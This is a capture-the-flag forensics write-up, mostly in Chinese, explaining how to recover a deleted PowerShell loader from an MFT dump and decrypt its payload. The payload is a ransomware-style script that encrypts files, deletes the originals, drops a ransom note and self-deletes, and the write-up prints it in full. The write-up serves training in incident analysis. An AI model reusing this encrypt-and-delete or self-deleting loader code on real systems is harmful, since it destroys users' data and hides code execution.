# L3akCTF - 2025
###### Contributed by [@scott987](https://github.com/scott987)

## Ghost In The Dark / Forensics

>A removable drive was recovered from a compromised system. Files appear encrypted, and a strange ransom note is all that remains.The payload? Gone.The key? Vanished.But traces linger in the shadows. Recover what was lost.Password to open zip
>
> [Ghost.zip](https://github.com/isip-hs-whoami/CTF-writeup/blob/main/L3akCTF%202025/Ghost%20In%20The%20Dark/Ghost.zip)

### Solution
雖然硬碟內容被加密，但因為在NTFS的dump中有MFT(Master File Table)(在隱藏資料夾 [SYSTEM]\\$MFT)，可以嘗試利用[工具](https://github.com/EricZimmerman/MFTECmd?tab=readme-ov-file)去還原檔案資訊，利用工具作者的MFTExplorer可以看到有一個被刪掉的powershell script

![MFTExplorer](https://github.com/isip-hs-whoami/CTF-writeup/blob/main/L3akCTF%202025/Ghost%20In%20The%20Dark/MFTExplorer.png)

其中可以得到：

```powershell=
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("abcdef9876543210")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

$enc = Get-Content "L:\payload.enc" -Raw
$bytes = [System.Convert]::FromBase64String($enc)
$decryptor = $AES.CreateDecryptor()
$plaintext = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
$script = [System.Text.Encoding]::UTF8.GetString($plaintext)

Invoke-Expression $script

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
```

得知加密方法是利用AES-CBC-PKCS7，也得到key和IV，因此可[解密payload.enc](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'UTF8','string':'0123456789abcdef'%7D,%7B'option':'UTF8','string':'abcdef9876543210'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=ZE01RGEyQ2llSG40OGIxRkxwSWVZK3o5SjVnY25aUk1ybUl5dEdqSHFZeitNcFFwc0t3Q1g3b1RjR1prOGdkU2tsaTh1T1JPOUFqZXZ6dFVrbk1LN3NySE5mNXc1QmN3WE42Uk44V1AzTUk3Zml1d09ZYmdXYmpXY011QS9OV1h6eFNseUVuMFZXQ1JyZ2I0Tk5PNDdscG9LSHU0WGJDRjF2cFEyY2RDMThBSEdSNklINnJLMm0zUzk0S1NZZHp5SkRWRkw1L2dpNFNDcnJDNEIxYXBGZjB2dkcwSkhZSzFOUHlFUGdzaUlRVVNCWjd1WnlWRDROVWczNDlhL2VJYVR3djBLWStMbnFRNWs1bXdnRUJLQUZhb2Q5OHliT25zV0ovM3lRcWgwTGRqV1g3NFc2TDZsMTVURWtnLys0QWtQRWlDd1NEdm1qZVRQZ0s1TUk1UWV4clFUdDdRcnltNFJNUjYrcktaVDdGcGxNblZYZ3owNFJxdGpOTjNYdThsVHRGTU5RQ01OdktiNE5rRWxBdm9nV3NMTFhBcllYZTkwMGloKzBmTjFGRmNTaW01aEY3WGhlMDI5b1dsdngrak9TTFZtWmdqVkh5eFljSDlTdHQwLzZUYitHSzV4ODdXV0Q0WmJEQXhjak9rczdQUGZwT1VXemhQQU1LZUl3ang1SDRMWUVZa294cHZxd25BdTVFU1ZLYlZCVTBIc3FxNEhNRGROV1BDSkJvNnFLZzFJTmw1TzVGTW9IcXdMY3ZHakErc3Q5SWxCYUxxekxhcHNmYTd0OVM2bjZheUYzSFMxbkFpMkt3WFQ1MzNpUzg5QWFZdnBaa3hpdmx5Q2xmODJBMi8yd0V4NVZvRmxaMjJMNVNBNWxKc3VVcis5aDN3NXpLMHdlL0J2RmJPWjJFV245aEVXazhBbUtTTkpKZkJuNTN1SU00Q280cys3MHExbHZaLytyL0pLbGkxd0dkTFkzS2dZNTQ1R1NjdWZJQU9pN2VPRVk2bUU2dFVTalE5Rk1xZnNzUUVjd0NZWS9mU1NrbnpzNHhubG16K2ppQ0xienlQNFkxNVhadnFWd1hGeWtFZDAxM25tejViNmZGMFhDRTRtbHc4aEp5b2ZNckhEWnUwS1Z6U04rSXcrRXNxRzAzMWgwb2lEenRWdUx1T0s0NC8zT1hiNmducmJ1TUhJSzFLMkZ0SUVYMXJ5TlNleXhpdGtJRWU3VTQ4bHhSL2lPWk1HTXR6RnV1Um9RYmhLRnNXRVpwY29oYVpzbmFtWGpWbWNVNkhISTJNNEhqNFdsS1BRZnF6MURjUmR5R1FJekhuK1ltRTFOM3RLckIzY25DSGh2SklEYUUvbDlzMVRDSTM0RVhya2NXS1M3Z1pGT2djQTdqMGpuK05jUTQ3dmZmRFRBUXU4L1k4OWJvQWU1SkE5clFBRkpZV0c1UDZ0d08vQi8vWkNEMVJUNlZQSWNmUkxZVFZ5TzdWa2xWNHdsT2lOM2lVOUhTcjQxSjR0cGxtR2hUVE0xUzFhUjBWMzJxU0hZMzYyUnZaekYyWjJHN2hlS1lodzE5MERYRG45ckg4TXRYZUI5OWtKNUd6R2YwTmZlR2RtZmZiS3dFUzRuT1k0L0pCaTVMdzFSUEJ2QVlPNk1RbW9Ob2U3ZkpCZDRIbWwzR3FZd01mc1VVN29QWXRvNHBvS3lSQjFoUWVoMXBjdFZLRFpPUGZIbWcvZE91eTRySTNLM1VuY01iZ0RkK0FIb2kyampGU1l4aDZZM2FRc0hkSGplaC9RMWlCN0IrTzhZMGs0SU5OZklxYXRzSVQ1TEJiK3NqQkN6bEZVdFhSbnJKQ0dMZG5FUksweEgrSmFES3ZXZm1TS1c4OFFFc2htVk1ZR1RyVGVkUDRkUjFEaEZFTFVST2VpbE9vOHQ3K28wd1RHaHlZTHRiSlllVHBnREhoVUJCc2FYcm5Ba1ZKUmxjOGIwTVNBZWJJYUhyazhGM3BKSWI3ZldWZjVQMUFCVm0xVnAvQ2xWUHAwUk5Ec3p5YXd4OElJeFNXNDM0OSsvWk8rck5WcXd2RmthTGU5d0tNYmdsWlp1UGFWMEx0dldVZUNNRU1Xd1ZmMXFBTlNMVVdxU3owcGdrMHg1WWFsZXdCNFl2bVhseFlDZG1pM0JsT3ZIbG1ydFZpak1md1grTTladkpEaWQyTnpudkw3OWs1cGRRclYzRXNEVWo1V2k2bUhLdWRWdEFoekdYMmVnWGtWQUtoSmpwdXM1Ty9BQnRScXNJdDNxcVYvUUo1ZWZTUStvUDZtVHd1dDdqb0RPWGk1eUNwN09SQ3RsQU15ZFpMQlhZbzBqc0hYNWVVSEVwaFBVemk5a09va0VZdGpVMkdQdkQ2ME52U0dyK09sVVgwTWRCVDVlSGQwcTNWd3lBWUhtNDVYd0c0YTFCbTdRcGc0VUJpMkdtUXdQWnBaVkt1NmlPWXE1ZHE4UkZ1cWJ5RDJoU2NVZENOcHJqaGo1TnU4dzNRNU9nSTBhWm02ZERIcVhCeWlyMTB5amVHcVdpUlRrNDFmb2ZmMENYNDF6Q052ditXWkNmQkZCdnBPMFRIeUJSVHJnbEdSNGhmWUY2emJtMkRDRXk0eUFyTWRkYVpwZkpETzZQb290RTcvOXNRbGFacERnS21QVFA1UmVObGk2ZUpPTUhzREFLdDViVVNEdmdWUGJNRzJDSG5zTEdyNHcwM284ajZ4Z1o4RmY2NVpmRTE4R3JVQjlTd1pnPT0K)

同樣是powershell script：

```powershell=
$key = [System.Text.Encoding]::UTF8.GetBytes("m4yb3w3d0nt3x1st")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("l1f31sf0rl1v1ng!")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

# Load plaintext flag from C:\ (never written to L:\ in plaintext)
$flag = Get-Content "C:\Users\Blue\Desktop\StageRansomware\flag.txt" -Raw
$encryptor = $AES.CreateEncryptor()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($flag)
$cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[System.IO.File]::WriteAllBytes("L:\flag.enc", $cipher)

# Encrypt other files staged in D:\ (or L:\ if you're using L:\ now)
$files = Get-ChildItem "L:\" -File | Where-Object {
    $_.Name -notin @("ransom.ps1", "ransom_note.txt", "flag.enc", "payload.enc", "loader.ps1")
}

foreach ($file in $files) {
    $plaintext = Get-Content $file.FullName -Raw
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [System.IO.File]::WriteAllBytes("L:\$($file.BaseName).enc", $cipher)
    Remove-Item $file.FullName
}

# Write ransom note
$ransomNote = @"
i didn't mean to encrypt them.
i was just trying to remember.

the key? maybe it's still somewhere in the dark.
the script? it was scared, so it disappeared too.

maybe you'll find me.
maybe you'll find yourself.

- vivi (or his ghost)
"@
Set-Content "L:\ransom_note.txt" $ransomNote -Encoding UTF8

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
```
利用其中的key和IV[解密flag](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'UTF8','string':'m4yb3w3d0nt3x1st'%7D,%7B'option':'UTF8','string':'l1f31sf0rl1v1ng!'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=13XwLAHJ%2Bu3z5S6gMtyRZudbusHQRnZNBf1607AaA8ki%2BzVLxlqvoN75oR0cCCq1)

最後得到flag:`L3AK{d3let3d_but_n0t_f0rg0tt3n}`

### reference
- [Master File Table](https://learn.microsoft.com/en-us/windows/win32/fileio/master-file-table)
- [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md)